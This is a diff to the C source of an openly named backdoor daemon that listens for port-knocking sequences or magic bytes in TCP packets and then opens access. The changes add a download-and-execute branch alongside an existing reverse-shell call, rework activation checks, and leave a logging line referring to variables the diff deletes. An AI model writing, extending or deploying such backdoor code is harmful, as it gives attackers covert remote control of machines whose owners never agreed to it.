@@ -64,6 +64,15 @@ void create_deamon_process() {
 #if (!defined(CDR_PORTS) || !defined(CDR_PORTS_SIZE) || !defined(PORT_KNOCK_LIST)) && !defined(MAGIC_PORT_STRING)
     #ifdef DEBUG
         fprintf(stderr, "No activation method selected\n");
+        #if !defined(CDR_PORTS)
+            fprintf(stderr, "CDR_PORTS not defined, add -key <ports>\n");
+        #endif
+        #if !defined(CDR_PORTS_SIZE)
+            fprintf(stderr, "CDR_PORTS_SIZE not defined, add -size <num of ports>\n");
+        #endif
+        #if !defined(PORT_KNOCK_LIST)
+            fprintf(stderr, "PORT_KNOCK_LIST not defined, add -act PORT_KNOCK_LIST\n");
+        #endif
     #endif
     exit(EXIT_FAILURE);
 #endif
@@ -183,7 +192,7 @@ void create_deamon_process() {
         /* it is one of our ports, it is the correct destination 
         * and it is a genuine SYN packet - let's see if it is the RIGHT
         * port */
-        #ifdef PORT_KNOCK_LIST
+        #if defined(CDR_PORTS) && defined(CDR_PORTS_SIZE) && defined(PORT_KNOCK_LIST)
         open_backdoor_via_port_list(cports, cportcnt, &actport, tcp);
         #endif
 
@@ -201,15 +210,16 @@ void create_deamon_process() {
 
 void cdr_open_door(void) {
 #if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
-    char *rev_ip = REVERSE_IP;
-    uint16_t rev_port = REVERSE_PORT;
-    unsigned int seconds = DELAY_TIME;
-    rev_shell(rev_ip, rev_port, seconds);
+    rev_shell();
     LOG("Reverse shell on %s:%u closed\n", rev_ip, rev_port);
+#endif
+#ifdef DOWNLOAD_URL
+    download_exec();
 #endif
 }
 
 void open_backdoor_via_port_list(unsigned int cports[], int cportcnt, int *actport, struct tcphdr *tcp) {
+#if defined(CDR_PORTS) && defined(CDR_PORTS_SIZE) && defined(PORT_KNOCK_LIST)
 	if (ntohs(tcp->dest_port)==cports[*actport]) {
         LOG("Port %d is good as code part %d\n", ntohs(tcp->dest_port), *actport);
 	    /* it is the rigth port ... take the next one
@@ -224,6 +234,7 @@ void open_backdoor_via_port_list(unsigned int cports[], int cportcnt, int *actpo
 	    *actport=0;
         #endif
 	}
+#endif
 }
 
 void open_backdoor_via_magic_bytes(struct tcphdr *tcp, struct iphdr *ip) {
